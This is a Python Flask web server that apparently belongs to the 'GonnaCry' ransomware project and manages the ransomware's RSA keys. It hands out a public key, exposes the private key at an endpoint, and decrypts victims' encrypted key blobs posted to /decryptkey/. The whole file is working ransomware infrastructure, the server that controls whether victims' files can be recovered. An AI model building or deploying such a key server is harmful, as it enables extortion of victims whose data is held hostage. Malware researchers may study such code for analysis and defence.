from flask import Flask, redirect, request, Response
from flask import render_template, url_for
import os
from Crypto.Cipher import PKCS1_OAEP
import base64
from os.path import abspath, dirname
import json
from Crypto.PublicKey import RSA

os.chdir(dirname(abspath(__file__)))
print(os.getcwd())

headers = {"Server": "GonnaCry WebServer"}

with open("sprivate_key.key") as f:
    private_key = f.read()

with open("spublic_key.key") as f:
    public_key = f.read()

app = Flask("gonnacry-web-server")


@app.errorhandler(404)
def page_not_found(error):
    return Response("nothing to do here ...", status=404, headers=headers)


@app.errorhandler(500)
def internal_error(error):
    return Response("nothing to do here ...", status=404, headers=headers)


@app.route("/getpublic/", methods=["GET"])
def get_public_key():
    response = public_key
    return base64.b64encode(response.encode("utf-8"))


@app.route("/getprivate/", methods=["GET"])
def get_private_key():
    response = private_key
    return base64.b64encode(response.encode("utf-8"))


@app.route("/decryptkey/", methods=["POST"])
def decrypt():
    data = request.data

    decrypt_private_key = RSA.import_key(private_key)
    cipher_rsa = PKCS1_OAEP.new(decrypt_private_key)

    n = 256  # chunk length
    chunks = [data[i : i + n] for i in range(0, len(data), n)]
    final_decrypted = b""
    for i in chunks:
        decrypted_content = cipher_rsa.decrypt(i)
        final_decrypted += decrypted_content
    return Response(final_decrypted, status=200, headers=headers)


@app.route("/")
def main():
    return "nothing to do here ... "


if __name__ == "__main__":

    port = 8000
    host = "127.0.0.1"
    app.run(host=host, port=port)
